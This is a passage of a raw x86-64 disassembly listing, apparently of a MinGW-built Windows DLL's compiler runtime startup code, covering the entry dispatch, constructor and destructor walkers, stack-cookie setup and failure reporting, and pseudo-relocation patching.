    6d8cd139:	e8 4b b1 ff ff       	call   0x6d8c8289
    6d8cd13e:	e8 3d b3 ff ff       	call   0x6d8c8480
    6d8cd143:	e8 64 ba ff ff       	call   0x6d8c8bac
    6d8cd148:	e8 be ba ff ff       	call   0x6d8c8c0b
    6d8cd14d:	e8 6e ca ff ff       	call   0x6d8c9bc0
    6d8cd152:	e8 37 d4 ff ff       	call   0x6d8ca58e
    6d8cd157:	e8 02 e3 ff ff       	call   0x6d8cb45e
    6d8cd15c:	e8 61 ff ff ff       	call   0x6d8cd0c2
    6d8cd161:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    6d8cd166:	ff d0                	call   *%rax
    6d8cd168:	90                   	nop
    6d8cd169:	48 83 c4 38          	add    $0x38,%rsp
    6d8cd16d:	c3                   	ret
    6d8cd16e:	48 83 ec 38          	sub    $0x38,%rsp
    6d8cd172:	e8 85 ff ff ff       	call   0x6d8cd0fc
    6d8cd177:	48 8d 05 3f ff ff ff 	lea    -0xc1(%rip),%rax        # 0x6d8cd0bd
    6d8cd17e:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
    6d8cd183:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8cd188:	e8 42 4b ff ff       	call   0x6d8c1ccf
    6d8cd18d:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    6d8cd192:	ff d0                	call   *%rax
    6d8cd194:	90                   	nop
    6d8cd195:	48 83 c4 38          	add    $0x38,%rsp
    6d8cd199:	c3                   	ret
    6d8cd19a:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cd19e:	83 fa 01             	cmp    $0x1,%edx
    6d8cd1a1:	75 07                	jne    0x6d8cd1aa
    6d8cd1a3:	e8 c6 ff ff ff       	call   0x6d8cd16e
    6d8cd1a8:	eb 05                	jmp    0x6d8cd1af
    6d8cd1aa:	83 fa 02             	cmp    $0x2,%edx
    6d8cd1ad:	74 f4                	je     0x6d8cd1a3
    6d8cd1af:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8cd1b4:	48 83 c4 28          	add    $0x28,%rsp
    6d8cd1b8:	e9 99 84 ff ff       	jmp    0x6d8c5656
    6d8cd1bd:	90                   	nop
    6d8cd1be:	90                   	nop
    6d8cd1bf:	90                   	nop
    6d8cd1c0:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cd1c4:	48 8b 05 15 3e 00 00 	mov    0x3e15(%rip),%rax        # 0x6d8d0fe0
    6d8cd1cb:	48 8b 00             	mov    (%rax),%rax
    6d8cd1ce:	48 85 c0             	test   %rax,%rax
    6d8cd1d1:	74 1d                	je     0x6d8cd1f0
    6d8cd1d3:	ff d0                	call   *%rax
    6d8cd1d5:	48 8b 05 04 3e 00 00 	mov    0x3e04(%rip),%rax        # 0x6d8d0fe0
    6d8cd1dc:	48 8d 50 08          	lea    0x8(%rax),%rdx
    6d8cd1e0:	48 8b 40 08          	mov    0x8(%rax),%rax
    6d8cd1e4:	48 89 15 f5 3d 00 00 	mov    %rdx,0x3df5(%rip)        # 0x6d8d0fe0
    6d8cd1eb:	48 85 c0             	test   %rax,%rax
    6d8cd1ee:	75 e3                	jne    0x6d8cd1d3
    6d8cd1f0:	48 83 c4 28          	add    $0x28,%rsp
    6d8cd1f4:	c3                   	ret
    6d8cd1f5:	90                   	nop
    6d8cd1f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8cd1fd:	00 00 00 
    6d8cd200:	56                   	push   %rsi
    6d8cd201:	53                   	push   %rbx
    6d8cd202:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cd206:	48 8b 0d c3 b5 0e 00 	mov    0xeb5c3(%rip),%rcx        # 0x6d9b87d0
    6d8cd20d:	48 8b 11             	mov    (%rcx),%rdx
    6d8cd210:	83 fa ff             	cmp    $0xffffffff,%edx
    6d8cd213:	89 d0                	mov    %edx,%eax
    6d8cd215:	74 39                	je     0x6d8cd250
    6d8cd217:	85 c0                	test   %eax,%eax
    6d8cd219:	74 20                	je     0x6d8cd23b
    6d8cd21b:	89 c2                	mov    %eax,%edx
    6d8cd21d:	83 e8 01             	sub    $0x1,%eax
    6d8cd220:	48 8d 1c d1          	lea    (%rcx,%rdx,8),%rbx
    6d8cd224:	48 29 c2             	sub    %rax,%rdx
    6d8cd227:	48 8d 74 d1 f8       	lea    -0x8(%rcx,%rdx,8),%rsi
    6d8cd22c:	0f 1f 40 00          	nopl   0x0(%rax)
    6d8cd230:	ff 13                	call   *(%rbx)
    6d8cd232:	48 83 eb 08          	sub    $0x8,%rbx
    6d8cd236:	48 39 f3             	cmp    %rsi,%rbx
    6d8cd239:	75 f5                	jne    0x6d8cd230
    6d8cd23b:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 0x6d8cd1c0
    6d8cd242:	48 83 c4 28          	add    $0x28,%rsp
    6d8cd246:	5b                   	pop    %rbx
    6d8cd247:	5e                   	pop    %rsi
    6d8cd248:	e9 33 41 ff ff       	jmp    0x6d8c1380
    6d8cd24d:	0f 1f 00             	nopl   (%rax)
    6d8cd250:	31 c0                	xor    %eax,%eax
    6d8cd252:	eb 02                	jmp    0x6d8cd256
    6d8cd254:	89 d0                	mov    %edx,%eax
    6d8cd256:	44 8d 40 01          	lea    0x1(%rax),%r8d
    6d8cd25a:	4a 83 3c c1 00       	cmpq   $0x0,(%rcx,%r8,8)
    6d8cd25f:	4c 89 c2             	mov    %r8,%rdx
    6d8cd262:	75 f0                	jne    0x6d8cd254
    6d8cd264:	eb b1                	jmp    0x6d8cd217
    6d8cd266:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8cd26d:	00 00 00 
    6d8cd270:	8b 05 ca fc 0e 00    	mov    0xefcca(%rip),%eax        # 0x6d9bcf40
    6d8cd276:	85 c0                	test   %eax,%eax
    6d8cd278:	74 06                	je     0x6d8cd280
    6d8cd27a:	c3                   	ret
    6d8cd27b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    6d8cd280:	c7 05 b6 fc 0e 00 01 	movl   $0x1,0xefcb6(%rip)        # 0x6d9bcf40
    6d8cd287:	00 00 00 
    6d8cd28a:	e9 71 ff ff ff       	jmp    0x6d8cd200
    6d8cd28f:	90                   	nop
    6d8cd290:	41 54                	push   %r12
    6d8cd292:	55                   	push   %rbp
    6d8cd293:	57                   	push   %rdi
    6d8cd294:	56                   	push   %rsi
    6d8cd295:	53                   	push   %rbx
    6d8cd296:	48 83 ec 30          	sub    $0x30,%rsp
    6d8cd29a:	48 8b 1d 9f 3d 00 00 	mov    0x3d9f(%rip),%rbx        # 0x6d8d1040
    6d8cd2a1:	48 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rax
    6d8cd2a8:	2b 00 00 
    6d8cd2ab:	48 39 c3             	cmp    %rax,%rbx
    6d8cd2ae:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
    6d8cd2b5:	00 00 
    6d8cd2b7:	74 17                	je     0x6d8cd2d0
    6d8cd2b9:	48 f7 d3             	not    %rbx
    6d8cd2bc:	48 89 1d 8d 3d 00 00 	mov    %rbx,0x3d8d(%rip)        # 0x6d8d1050
    6d8cd2c3:	48 83 c4 30          	add    $0x30,%rsp
    6d8cd2c7:	5b                   	pop    %rbx
    6d8cd2c8:	5e                   	pop    %rsi
    6d8cd2c9:	5f                   	pop    %rdi
    6d8cd2ca:	5d                   	pop    %rbp
    6d8cd2cb:	41 5c                	pop    %r12
    6d8cd2cd:	c3                   	ret
    6d8cd2ce:	66 90                	xchg   %ax,%ax
    6d8cd2d0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    6d8cd2d5:	ff 15 49 3f 10 00    	call   *0x103f49(%rip)        # 0x6d9d1224
    6d8cd2db:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
    6d8cd2e0:	ff 15 1e 3f 10 00    	call   *0x103f1e(%rip)        # 0x6d9d1204
    6d8cd2e6:	41 89 c4             	mov    %eax,%r12d
    6d8cd2e9:	ff 15 1d 3f 10 00    	call   *0x103f1d(%rip)        # 0x6d9d120c
    6d8cd2ef:	89 c5                	mov    %eax,%ebp
    6d8cd2f1:	ff 15 35 3f 10 00    	call   *0x103f35(%rip)        # 0x6d9d122c
    6d8cd2f7:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
    6d8cd2fc:	89 c7                	mov    %eax,%edi
    6d8cd2fe:	ff 15 48 3f 10 00    	call   *0x103f48(%rip)        # 0x6d9d124c
    6d8cd304:	48 33 74 24 28       	xor    0x28(%rsp),%rsi
    6d8cd309:	44 89 e0             	mov    %r12d,%eax
    6d8cd30c:	48 ba ff ff ff ff ff 	movabs $0xffffffffffff,%rdx
    6d8cd313:	ff 00 00 
    6d8cd316:	48 31 f0             	xor    %rsi,%rax
    6d8cd319:	89 ee                	mov    %ebp,%esi
    6d8cd31b:	48 31 c6             	xor    %rax,%rsi
    6d8cd31e:	89 f8                	mov    %edi,%eax
    6d8cd320:	48 31 f0             	xor    %rsi,%rax
    6d8cd323:	48 21 d0             	and    %rdx,%rax
    6d8cd326:	48 39 d8             	cmp    %rbx,%rax
    6d8cd329:	74 25                	je     0x6d8cd350
    6d8cd32b:	48 89 c2             	mov    %rax,%rdx
    6d8cd32e:	48 f7 d2             	not    %rdx
    6d8cd331:	48 89 05 08 3d 00 00 	mov    %rax,0x3d08(%rip)        # 0x6d8d1040
    6d8cd338:	48 89 15 11 3d 00 00 	mov    %rdx,0x3d11(%rip)        # 0x6d8d1050
    6d8cd33f:	48 83 c4 30          	add    $0x30,%rsp
    6d8cd343:	5b                   	pop    %rbx
    6d8cd344:	5e                   	pop    %rsi
    6d8cd345:	5f                   	pop    %rdi
    6d8cd346:	5d                   	pop    %rbp
    6d8cd347:	41 5c                	pop    %r12
    6d8cd349:	c3                   	ret
    6d8cd34a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6d8cd350:	48 ba cc 5d 20 d2 66 	movabs $0xffffd466d2205dcc,%rdx
    6d8cd357:	d4 ff ff 
    6d8cd35a:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
    6d8cd361:	2b 00 00 
    6d8cd364:	eb cb                	jmp    0x6d8cd331
    6d8cd366:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8cd36d:	00 00 00 
    6d8cd370:	55                   	push   %rbp
    6d8cd371:	56                   	push   %rsi
    6d8cd372:	53                   	push   %rbx
    6d8cd373:	48 89 e5             	mov    %rsp,%rbp
    6d8cd376:	48 83 ec 70          	sub    $0x70,%rsp
    6d8cd37a:	48 89 ce             	mov    %rcx,%rsi
    6d8cd37d:	48 8d 0d dc fb 0e 00 	lea    0xefbdc(%rip),%rcx        # 0x6d9bcf60
    6d8cd384:	ff 15 d2 3e 10 00    	call   *0x103ed2(%rip)        # 0x6d9d125c
    6d8cd38a:	48 8b 1d c7 fc 0e 00 	mov    0xefcc7(%rip),%rbx        # 0x6d9bd058
    6d8cd391:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
    6d8cd395:	45 31 c0             	xor    %r8d,%r8d
    6d8cd398:	48 89 d9             	mov    %rbx,%rcx
    6d8cd39b:	ff 15 c3 3e 10 00    	call   *0x103ec3(%rip)        # 0x6d9d1264
    6d8cd3a1:	48 85 c0             	test   %rax,%rax
    6d8cd3a4:	0f 84 a3 00 00 00    	je     0x6d8cd44d
    6d8cd3aa:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
    6d8cd3ae:	49 89 c1             	mov    %rax,%r9
    6d8cd3b1:	49 89 d8             	mov    %rbx,%r8
    6d8cd3b4:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    6d8cd3bb:	00 00 
    6d8cd3bd:	48 8d 0d 9c fb 0e 00 	lea    0xefb9c(%rip),%rcx        # 0x6d9bcf60
    6d8cd3c4:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
    6d8cd3c9:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
    6d8cd3cd:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
    6d8cd3d2:	31 c9                	xor    %ecx,%ecx
    6d8cd3d4:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
    6d8cd3d9:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    6d8cd3dd:	ff 15 89 3e 10 00    	call   *0x103e89(%rip)        # 0x6d9d126c
    6d8cd3e3:	48 8b 05 6e fc 0e 00 	mov    0xefc6e(%rip),%rax        # 0x6d9bd058
    6d8cd3ea:	31 c9                	xor    %ecx,%ecx
    6d8cd3ec:	48 89 35 ed fb 0e 00 	mov    %rsi,0xefbed(%rip)        # 0x6d9bcfe0
    6d8cd3f3:	48 89 05 56 00 0f 00 	mov    %rax,0xf0056(%rip)        # 0x6d9bd450
    6d8cd3fa:	48 b8 09 04 00 c0 01 	movabs $0x1c0000409,%rax
    6d8cd401:	00 00 00 
    6d8cd404:	48 89 05 35 00 0f 00 	mov    %rax,0xf0035(%rip)        # 0x6d9bd440
    6d8cd40b:	48 8b 05 2e 3c 00 00 	mov    0x3c2e(%rip),%rax        # 0x6d8d1040
    6d8cd412:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    6d8cd416:	48 8b 05 33 3c 00 00 	mov    0x3c33(%rip),%rax        # 0x6d8d1050
    6d8cd41d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    6d8cd421:	ff 15 4d 3e 10 00    	call   *0x103e4d(%rip)        # 0x6d9d1274
    6d8cd427:	48 8d 0d 92 af 0e 00 	lea    0xeaf92(%rip),%rcx        # 0x6d9b83c0
    6d8cd42e:	ff 15 60 3e 10 00    	call   *0x103e60(%rip)        # 0x6d9d1294
    6d8cd434:	ff 15 c2 3d 10 00    	call   *0x103dc2(%rip)        # 0x6d9d11fc
    6d8cd43a:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
    6d8cd43f:	48 89 c1             	mov    %rax,%rcx
    6d8cd442:	ff 15 3c 3e 10 00    	call   *0x103e3c(%rip)        # 0x6d9d1284
    6d8cd448:	e8 4b 11 00 00       	call   0x6d8ce598
    6d8cd44d:	48 8b 45 18          	mov    0x18(%rbp),%rax
    6d8cd451:	48 89 05 00 fc 0e 00 	mov    %rax,0xefc00(%rip)        # 0x6d9bd058
    6d8cd458:	48 8d 45 08          	lea    0x8(%rbp),%rax
    6d8cd45c:	48 89 05 95 fb 0e 00 	mov    %rax,0xefb95(%rip)        # 0x6d9bcff8
    6d8cd463:	e9 7b ff ff ff       	jmp    0x6d8cd3e3
    6d8cd468:	90                   	nop
    6d8cd469:	90                   	nop
    6d8cd46a:	90                   	nop
    6d8cd46b:	90                   	nop
    6d8cd46c:	90                   	nop
    6d8cd46d:	90                   	nop
    6d8cd46e:	90                   	nop
    6d8cd46f:	90                   	nop
    6d8cd470:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cd474:	83 fa 03             	cmp    $0x3,%edx
    6d8cd477:	74 17                	je     0x6d8cd490
    6d8cd479:	85 d2                	test   %edx,%edx
    6d8cd47b:	74 13                	je     0x6d8cd490
    6d8cd47d:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8cd482:	48 83 c4 28          	add    $0x28,%rsp
    6d8cd486:	c3                   	ret
    6d8cd487:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    6d8cd48e:	00 00 
    6d8cd490:	e8 5b 0b 00 00       	call   0x6d8cdff0
    6d8cd495:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8cd49a:	48 83 c4 28          	add    $0x28,%rsp
    6d8cd49e:	c3                   	ret
    6d8cd49f:	90                   	nop
    6d8cd4a0:	56                   	push   %rsi
    6d8cd4a1:	53                   	push   %rbx
    6d8cd4a2:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cd4a6:	48 8b 05 13 b3 0e 00 	mov    0xeb313(%rip),%rax        # 0x6d9b87c0
    6d8cd4ad:	83 38 02             	cmpl   $0x2,(%rax)
    6d8cd4b0:	74 06                	je     0x6d8cd4b8
    6d8cd4b2:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
    6d8cd4b8:	83 fa 02             	cmp    $0x2,%edx
    6d8cd4bb:	74 13                	je     0x6d8cd4d0
    6d8cd4bd:	83 fa 01             	cmp    $0x1,%edx
    6d8cd4c0:	74 40                	je     0x6d8cd502
    6d8cd4c2:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8cd4c7:	48 83 c4 28          	add    $0x28,%rsp
    6d8cd4cb:	5b                   	pop    %rbx
    6d8cd4cc:	5e                   	pop    %rsi
    6d8cd4cd:	c3                   	ret
    6d8cd4ce:	66 90                	xchg   %ax,%ax
    6d8cd4d0:	48 8d 1d 79 4b 10 00 	lea    0x104b79(%rip),%rbx        # 0x6d9d2050
    6d8cd4d7:	48 8d 35 72 4b 10 00 	lea    0x104b72(%rip),%rsi        # 0x6d9d2050
    6d8cd4de:	48 39 de             	cmp    %rbx,%rsi
    6d8cd4e1:	74 df                	je     0x6d8cd4c2
    6d8cd4e3:	48 8b 03             	mov    (%rbx),%rax
    6d8cd4e6:	48 85 c0             	test   %rax,%rax
    6d8cd4e9:	74 02                	je     0x6d8cd4ed
    6d8cd4eb:	ff d0                	call   *%rax
    6d8cd4ed:	48 83 c3 08          	add    $0x8,%rbx
    6d8cd4f1:	48 39 de             	cmp    %rbx,%rsi
    6d8cd4f4:	75 ed                	jne    0x6d8cd4e3
    6d8cd4f6:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8cd4fb:	48 83 c4 28          	add    $0x28,%rsp
    6d8cd4ff:	5b                   	pop    %rbx
    6d8cd500:	5e                   	pop    %rsi
    6d8cd501:	c3                   	ret
    6d8cd502:	e8 e9 0a 00 00       	call   0x6d8cdff0
    6d8cd507:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8cd50c:	48 83 c4 28          	add    $0x28,%rsp
    6d8cd510:	5b                   	pop    %rbx
    6d8cd511:	5e                   	pop    %rsi
    6d8cd512:	c3                   	ret
    6d8cd513:	0f 1f 00             	nopl   (%rax)
    6d8cd516:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8cd51d:	00 00 00 
    6d8cd520:	31 c0                	xor    %eax,%eax
    6d8cd522:	c3                   	ret
    6d8cd523:	90                   	nop
    6d8cd524:	90                   	nop
    6d8cd525:	90                   	nop
    6d8cd526:	90                   	nop
    6d8cd527:	90                   	nop
    6d8cd528:	90                   	nop
    6d8cd529:	90                   	nop
    6d8cd52a:	90                   	nop
    6d8cd52b:	90                   	nop
    6d8cd52c:	90                   	nop
    6d8cd52d:	90                   	nop
    6d8cd52e:	90                   	nop
    6d8cd52f:	90                   	nop
    6d8cd530:	48 89 c8             	mov    %rcx,%rax
    6d8cd533:	c3                   	ret
    6d8cd534:	66 90                	xchg   %ax,%ax
    6d8cd536:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8cd53d:	00 00 00 
    6d8cd540:	48 89 c8             	mov    %rcx,%rax
    6d8cd543:	c3                   	ret
    6d8cd544:	90                   	nop
    6d8cd545:	90                   	nop
    6d8cd546:	90                   	nop
    6d8cd547:	90                   	nop
    6d8cd548:	90                   	nop
    6d8cd549:	90                   	nop
    6d8cd54a:	90                   	nop
    6d8cd54b:	90                   	nop
    6d8cd54c:	90                   	nop
    6d8cd54d:	90                   	nop
    6d8cd54e:	90                   	nop
    6d8cd54f:	90                   	nop
    6d8cd550:	41 54                	push   %r12
    6d8cd552:	55                   	push   %rbp
    6d8cd553:	57                   	push   %rdi
    6d8cd554:	56                   	push   %rsi
    6d8cd555:	53                   	push   %rbx
    6d8cd556:	48 83 ec 50          	sub    $0x50,%rsp
    6d8cd55a:	48 63 35 a3 ff 0e 00 	movslq 0xeffa3(%rip),%rsi        # 0x6d9bd504
    6d8cd561:	85 f6                	test   %esi,%esi
    6d8cd563:	48 89 cb             	mov    %rcx,%rbx
    6d8cd566:	48 89 d5             	mov    %rdx,%rbp
    6d8cd569:	4c 89 c7             	mov    %r8,%rdi
    6d8cd56c:	0f 8e 66 01 00 00    	jle    0x6d8cd6d8
    6d8cd572:	48 8b 05 8f ff 0e 00 	mov    0xeff8f(%rip),%rax        # 0x6d9bd508
    6d8cd579:	31 c9                	xor    %ecx,%ecx
    6d8cd57b:	48 83 c0 18          	add    $0x18,%rax
    6d8cd57f:	90                   	nop
    6d8cd580:	48 8b 10             	mov    (%rax),%rdx
    6d8cd583:	48 39 d3             	cmp    %rdx,%rbx
    6d8cd586:	72 14                	jb     0x6d8cd59c
    6d8cd588:	4c 8b 40 08          	mov    0x8(%rax),%r8
    6d8cd58c:	45 8b 40 08          	mov    0x8(%r8),%r8d
    6d8cd590:	4c 01 c2             	add    %r8,%rdx
    6d8cd593:	48 39 d3             	cmp    %rdx,%rbx
    6d8cd596:	0f 82 89 00 00 00    	jb     0x6d8cd625
    6d8cd59c:	83 c1 01             	add    $0x1,%ecx
    6d8cd59f:	48 83 c0 28          	add    $0x28,%rax
    6d8cd5a3:	39 f1                	cmp    %esi,%ecx
    6d8cd5a5:	75 d9                	jne    0x6d8cd580
    6d8cd5a7:	48 89 d9             	mov    %rbx,%rcx
    6d8cd5aa:	e8 41 0c 00 00       	call   0x6d8ce1f0
    6d8cd5af:	48 85 c0             	test   %rax,%rax
    6d8cd5b2:	49 89 c4             	mov    %rax,%r12
    6d8cd5b5:	0f 84 52 01 00 00    	je     0x6d8cd70d
    6d8cd5bb:	48 8b 05 46 ff 0e 00 	mov    0xeff46(%rip),%rax        # 0x6d9bd508
    6d8cd5c2:	48 8d 34 b6          	lea    (%rsi,%rsi,4),%rsi
    6d8cd5c6:	48 c1 e6 03          	shl    $0x3,%rsi
    6d8cd5ca:	48 01 f0             	add    %rsi,%rax
    6d8cd5cd:	4c 89 60 20          	mov    %r12,0x20(%rax)
    6d8cd5d1:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
    6d8cd5d7:	e8 44 0d 00 00       	call   0x6d8ce320
    6d8cd5dc:	41 8b 4c 24 0c       	mov    0xc(%r12),%ecx
    6d8cd5e1:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
    6d8cd5e6:	41 b8 30 00 00 00    	mov    $0x30,%r8d
    6d8cd5ec:	48 01 c1             	add    %rax,%rcx
    6d8cd5ef:	48 8b 05 12 ff 0e 00 	mov    0xeff12(%rip),%rax        # 0x6d9bd508
    6d8cd5f6:	48 89 4c 30 18       	mov    %rcx,0x18(%rax,%rsi,1)
    6d8cd5fb:	ff 15 b3 3c 10 00    	call   *0x103cb3(%rip)        # 0x6d9d12b4
    6d8cd601:	48 85 c0             	test   %rax,%rax
    6d8cd604:	0f 84 e6 00 00 00    	je     0x6d8cd6f0
    6d8cd60a:	8b 44 24 44          	mov    0x44(%rsp),%eax
    6d8cd60e:	8d 50 fc             	lea    -0x4(%rax),%edx
    6d8cd611:	83 e2 fb             	and    $0xfffffffb,%edx
    6d8cd614:	74 08                	je     0x6d8cd61e
    6d8cd616:	83 e8 40             	sub    $0x40,%eax
    6d8cd619:	83 e0 bf             	and    $0xffffffbf,%eax
    6d8cd61c:	75 62                	jne    0x6d8cd680
    6d8cd61e:	83 05 df fe 0e 00 01 	addl   $0x1,0xefedf(%rip)        # 0x6d9bd504
    6d8cd625:	83 ff 08             	cmp    $0x8,%edi
    6d8cd628:	73 29                	jae    0x6d8cd653
    6d8cd62a:	40 f6 c7 04          	test   $0x4,%dil
    6d8cd62e:	0f 85 90 00 00 00    	jne    0x6d8cd6c4
    6d8cd634:	85 ff                	test   %edi,%edi
    6d8cd636:	74 10                	je     0x6d8cd648
    6d8cd638:	0f b6 45 00          	movzbl 0x0(%rbp),%eax
    6d8cd63c:	40 f6 c7 02          	test   $0x2,%dil
    6d8cd640:	88 03                	mov    %al,(%rbx)
    6d8cd642:	0f 85 97 00 00 00    	jne    0x6d8cd6df
    6d8cd648:	48 83 c4 50          	add    $0x50,%rsp
    6d8cd64c:	5b                   	pop    %rbx
    6d8cd64d:	5e                   	pop    %rsi
    6d8cd64e:	5f                   	pop    %rdi
    6d8cd64f:	5d                   	pop    %rbp
    6d8cd650:	41 5c                	pop    %r12
    6d8cd652:	c3                   	ret
    6d8cd653:	89 f8                	mov    %edi,%eax
    6d8cd655:	83 ef 01             	sub    $0x1,%edi
    6d8cd658:	48 8b 54 05 f8       	mov    -0x8(%rbp,%rax,1),%rdx
    6d8cd65d:	83 ff 08             	cmp    $0x8,%edi
    6d8cd660:	48 89 54 03 f8       	mov    %rdx,-0x8(%rbx,%rax,1)
    6d8cd665:	72 e1                	jb     0x6d8cd648
    6d8cd667:	83 e7 f8             	and    $0xfffffff8,%edi
    6d8cd66a:	31 c0                	xor    %eax,%eax
    6d8cd66c:	89 c2                	mov    %eax,%edx
    6d8cd66e:	83 c0 08             	add    $0x8,%eax
    6d8cd671:	48 8b 4c 15 00       	mov    0x0(%rbp,%rdx,1),%rcx
    6d8cd676:	39 f8                	cmp    %edi,%eax
    6d8cd678:	48 89 0c 13          	mov    %rcx,(%rbx,%rdx,1)
    6d8cd67c:	72 ee                	jb     0x6d8cd66c
    6d8cd67e:	eb c8                	jmp    0x6d8cd648
    6d8cd680:	48 03 35 81 fe 0e 00 	add    0xefe81(%rip),%rsi        # 0x6d9bd508
    6d8cd687:	41 b8 40 00 00 00    	mov    $0x40,%r8d
    6d8cd68d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
    6d8cd692:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    6d8cd697:	49 89 f1             	mov    %rsi,%r9
    6d8cd69a:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
    6d8cd69e:	48 89 56 10          	mov    %rdx,0x10(%rsi)
    6d8cd6a2:	ff 15 04 3c 10 00    	call   *0x103c04(%rip)        # 0x6d9d12ac
    6d8cd6a8:	85 c0                	test   %eax,%eax
    6d8cd6aa:	0f 85 6e ff ff ff    	jne    0x6d8cd61e
    6d8cd6b0:	ff 15 5e 3b 10 00    	call   *0x103b5e(%rip)        # 0x6d9d1214
    6d8cd6b6:	48 8d 0d fb ad 0e 00 	lea    0xeadfb(%rip),%rcx        # 0x6d9b84b8
    6d8cd6bd:	89 c2                	mov    %eax,%edx
    6d8cd6bf:	e8 8c 11 00 00       	call   0x6d8ce850
    6d8cd6c4:	8b 45 00             	mov    0x0(%rbp),%eax
    6d8cd6c7:	89 ff                	mov    %edi,%edi
    6d8cd6c9:	89 03                	mov    %eax,(%rbx)
    6d8cd6cb:	8b 44 3d fc          	mov    -0x4(%rbp,%rdi,1),%eax
    6d8cd6cf:	89 44 3b fc          	mov    %eax,-0x4(%rbx,%rdi,1)
    6d8cd6d3:	e9 70 ff ff ff       	jmp    0x6d8cd648
    6d8cd6d8:	31 f6                	xor    %esi,%esi
    6d8cd6da:	e9 c8 fe ff ff       	jmp    0x6d8cd5a7
    6d8cd6df:	89 ff                	mov    %edi,%edi
    6d8cd6e1:	0f b7 44 3d fe       	movzwl -0x2(%rbp,%rdi,1),%eax
    6d8cd6e6:	66 89 44 3b fe       	mov    %ax,-0x2(%rbx,%rdi,1)
    6d8cd6eb:	e9 58 ff ff ff       	jmp    0x6d8cd648
    6d8cd6f0:	48 8b 05 11 fe 0e 00 	mov    0xefe11(%rip),%rax        # 0x6d9bd508
    6d8cd6f7:	48 8d 0d 82 ad 0e 00 	lea    0xead82(%rip),%rcx        # 0x6d9b8480
    6d8cd6fe:	41 8b 54 24 08       	mov    0x8(%r12),%edx
    6d8cd703:	4c 8b 44 30 18       	mov    0x18(%rax,%rsi,1),%r8
    6d8cd708:	e8 43 11 00 00       	call   0x6d8ce850
    6d8cd70d:	48 8d 0d 4c ad 0e 00 	lea    0xead4c(%rip),%rcx        # 0x6d9b8460
    6d8cd714:	48 89 da             	mov    %rbx,%rdx
    6d8cd717:	e8 34 11 00 00       	call   0x6d8ce850
    6d8cd71c:	90                   	nop
    6d8cd71d:	0f 1f 00             	nopl   (%rax)
    6d8cd720:	55                   	push   %rbp
    6d8cd721:	41 57                	push   %r15
    6d8cd723:	41 56                	push   %r14
    6d8cd725:	41 55                	push   %r13
    6d8cd727:	41 54                	push   %r12
    6d8cd729:	57                   	push   %rdi
    6d8cd72a:	56                   	push   %rsi
    6d8cd72b:	53                   	push   %rbx
    6d8cd72c:	48 83 ec 38          	sub    $0x38,%rsp
    6d8cd730:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
    6d8cd737:	00 
    6d8cd738:	8b 1d c2 fd 0e 00    	mov    0xefdc2(%rip),%ebx        # 0x6d9bd500
    6d8cd73e:	85 db                	test   %ebx,%ebx
    6d8cd740:	74 11                	je     0x6d8cd753
    6d8cd742:	48 8d 65 b8          	lea    -0x48(%rbp),%rsp
    6d8cd746:	5b                   	pop    %rbx
    6d8cd747:	5e                   	pop    %rsi
    6d8cd748:	5f                   	pop    %rdi
    6d8cd749:	41 5c                	pop    %r12
    6d8cd74b:	41 5d                	pop    %r13
    6d8cd74d:	41 5e                	pop    %r14
    6d8cd74f:	41 5f                	pop    %r15
    6d8cd751:	5d                   	pop    %rbp
    6d8cd752:	c3                   	ret
    6d8cd753:	c7 05 a3 fd 0e 00 01 	movl   $0x1,0xefda3(%rip)        # 0x6d9bd500
    6d8cd75a:	00 00 00 
    6d8cd75d:	e8 0e 0b 00 00       	call   0x6d8ce270
    6d8cd762:	48 98                	cltq
    6d8cd764:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    6d8cd768:	48 8d 04 c5 1e 00 00 	lea    0x1e(,%rax,8),%rax
    6d8cd76f:	00 
